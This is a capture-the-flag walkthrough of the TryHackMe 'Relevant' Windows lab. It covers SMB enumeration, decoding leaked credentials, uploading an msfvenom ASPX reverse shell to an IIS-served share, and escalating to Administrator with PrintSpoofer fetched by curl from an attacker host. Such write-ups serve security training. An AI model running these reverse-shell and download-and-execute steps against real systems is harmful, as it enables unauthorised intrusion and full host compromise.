![image](https://user-images.githubusercontent.com/87468669/194730336-181e5b0a-1b58-4890-90e6-61c69f6b6fbf.png)

```
You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

    User.txt
    Root.txt

Additionally, the client has provided the following scope allowances:

    Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
    Locate and note all vulnerabilities found
    Submit the flags discovered to the dashboard
    Only the IP address assigned to your machine is in scope
    Find and report ALL vulnerabilities (yes, there is more than one path to root)

(Roleplay off)
I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.

Note - Nothing in this room requires Metasploit

Machine may take up to 5 minutes for all services to start.
```

First we start with an nmap Scan...

```nmap -sC -sV -T4 -oN scan.txt -p- <Target IP>```

```
# Nmap 7.92 scan initiated Sun Oct  9 01:53:47 2022 as: nmap -sC -sV -T4 -oN fullmap.txt -p- 10.10.166.204
Nmap scan report for 10.10.166.204
Host is up (0.16s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2022-10-08T06:51:58
|_Not valid after:  2023-04-09T06:51:58
|_ssl-date: 2022-10-09T07:02:30+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-10-09T07:01:51+00:00
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-10-09T07:01:54
|_  start_date: 2022-10-09T06:52:21
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-10-09T00:01:52-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  9 02:02:30 2022 -- 1 IP address (1 host up) scanned in 523.28 seconds

```

Nice we've got http and smb ports open. Let's enumerate SMB first

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/THM/Relevant]
└─$ smbclient -L //10.10.166.204/ -N 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.166.204 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

Checking for anonymous access too the SMB shares 

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/THM/Relevant]
└─$ smbclient //10.10.166.204/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 16:46:04 2020
  ..                                  D        0  Sat Jul 25 16:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 10:15:33 2020

                7735807 blocks of size 4096. 5137539 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> 

```

we have anonymous access to the share and we downloaded passwords.txt. let's check the content 

![image](https://user-images.githubusercontent.com/87468669/194743542-2005798d-fc95-4c1d-80bc-d5605f9b9908.png)

It looks like a base64 encoding, let's decode it 

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/THM/Relevant]
└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d                                                                       
Bob - !P@$$W0rD!123                                                                                                                                                                       
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/THM/Relevant]
└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$     
```

we got some creds 🤔... we don't have ssh to use them, so let's enumerate the http service on port 

![image](https://user-images.githubusercontent.com/87468669/194743714-47b33d44-88ae-4bb4-a4ac-1e41b0199877.png)

check the smb share path on the webpage let's see.

![image](https://user-images.githubusercontent.com/87468669/194743758-f6355c5a-53ea-468b-8202-b275ac2be83e.png)

worked. let's check if we can upload a file into the smb server 

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/THM/Relevant]
└─$ smbclient //10.10.166.204/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> put fullmap.txt 
putting file fullmap.txt as \fullmap.txt (4.4 kb/s) (average 4.4 kb/s)
smb: \> ls
  .                                   D        0  Sun Oct  9 02:30:23 2022
  ..                                  D        0  Sun Oct  9 02:30:23 2022
  fullmap.txt                         A     2372  Sun Oct  9 02:30:23 2022
  passwords.txt                       A       98  Sat Jul 25 10:15:33 2020

                7735807 blocks of size 4096. 5137495 blocks available
smb: \> 
smb: \> 

```

we have upload permission, let's check the uploaded file in the browser 

![image](https://user-images.githubusercontent.com/87468669/194743915-78688677-2619-4981-96f2-302b04299a0e.png)

Great we can see our uploaded content, let's create a reverse shell and upload it through the smb Server. we would be using msfvenom payload

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/THM/Relevant]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.12.222 LPORT=9999 -f aspx > violence.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3432 bytes

```

let's upload it to the smb share

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/THM/Relevant]
└─$ smbclient //10.10.166.204/nt4wrksv -N 
Try "help" to get a list of possible commands.
smb: \> put violence.aspx 
putting file violence.aspx as \violence.aspx (6.8 kb/s) (average 6.8 kb/s)
smb: \> ls
  .                                   D        0  Sun Oct  9 02:37:00 2022
  ..                                  D        0  Sun Oct  9 02:37:00 2022
  fullmap.txt                         A     2372  Sun Oct  9 02:30:23 2022
  passwords.txt                       A       98  Sat Jul 25 10:15:33 2020
  violence.aspx                       A     3432  Sun Oct  9 02:37:01 2022

                7735807 blocks of size 4096. 5137483 blocks available
smb: \> 

```

set your ncat listener ready 

![image](https://user-images.githubusercontent.com/87468669/194744120-e07e7853-506a-48b4-af2e-e739b3686c1c.png)

now let's navigate to the browser and try pop up the shell

![image](https://user-images.githubusercontent.com/87468669/194744182-30b2d6a5-a1ac-48d0-96dc-70eb3e4afa49.png)

Check back our listener

![image](https://user-images.githubusercontent.com/87468669/194744269-a42e2bd1-d625-45df-9a65-0f8fca17a9ed.png)

We got shell into the system

```
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

c:\windows\system32\inetsrv>

```

```SeImpersonatePrivilege``` is enabled, now let find a way to abuse to get administrator access. And with the help of a tools called ```PrintSpoofer```

![image](https://user-images.githubusercontent.com/87468669/194744560-7c94aa38-e6db-4f60-bc9d-d21504abfe66.png)

Now let's download it into our target machine

```
c:\Users\Bob>powershell -c curl http://10.8.12.222:8000/PrintSpoofer.exe -o printspoofer.exe

printspoofer.exe -i -c powershell
```

![image](https://user-images.githubusercontent.com/87468669/194744953-18dc34cc-e8ed-44fd-8816-56131873b6a5.png)

We are now Administrator great 

![image](https://user-images.githubusercontent.com/87468669/194745074-41bab5ea-2e10-4765-a741-8a59ed483283.png)

And we are done. Hope you had fun 😉
